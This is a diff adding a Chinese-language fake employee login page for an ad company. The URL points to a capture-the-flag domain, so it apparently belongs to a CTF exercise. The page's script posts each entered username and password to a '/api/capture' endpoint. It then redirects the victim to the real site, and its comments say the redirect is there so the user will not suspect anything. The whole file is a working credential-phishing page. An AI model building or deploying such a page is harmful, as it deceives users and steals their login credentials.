@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blind Ads Cross Company - 员工登录</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 350px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #333;
+            text-align: center;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+        }
+        label {
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #777;
+        }
+        .error {
+            color: red;
+            margin-bottom: 10px;
+            display: none;
+        }
+        .tools-link {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+        .tools-link a {
+            color: #4CAF50;
+            text-decoration: none;
+        }
+        .tools-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h2>Blind Ads Cross Company</h2>
+        </div>
+        <h1>员工登录</h1>
+        <div id="errorMessage" class="error">用户名或密码错误，请重试。</div>
+        <form id="loginForm">
+            <label for="username">用户名:</label>
+            <input type="text" id="username" name="username" required>
+            
+            <label for="password">密码:</label>
+            <input type="password" id="password" name="password" required>
+            
+            <button type="submit">登录</button>
+        </form>
+        <div class="tools-link">
+            <a href="/submit_form.html">如何提交广告线索?</a>
+        </div>
+        <div class="footer">
+            <p>© 2023 Blind Ads Cross Company. 系统维护更新中，请重新登录访问广告线索页面。</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            // 发送凭据到我们的服务器
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    username: username,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    // 重定向到真实的网站，让用户不会怀疑
+                    window.location.href = 'https://a0138cc617b9a9b44301324f798e5273.ctf.bytedance.net/ads/';
+                } else {
+                    // 显示错误信息
+                    document.getElementById('errorMessage').style.display = 'block';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                document.getElementById('errorMessage').style.display = 'block';
+            });
+        });
+    </script>
+</body>
+</html> 
